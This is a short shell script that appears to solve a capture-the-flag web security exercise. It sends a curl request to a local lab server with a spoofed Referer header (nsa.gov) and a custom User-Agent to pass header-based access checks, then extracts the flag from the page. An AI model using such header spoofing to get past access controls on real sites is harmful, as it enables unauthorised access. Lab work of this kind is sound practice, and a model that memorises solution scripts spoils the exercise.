curl -s \
-H 'Referer: https://www.nsa.gov/' \
-H 'User-Agent: ft_bornToSec' \
'http://192.168.0.15/?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c' \
> flag.html
cat flag.html | grep "flag" \
| head -c 116 | tail -c 78
echo
rm flag.html
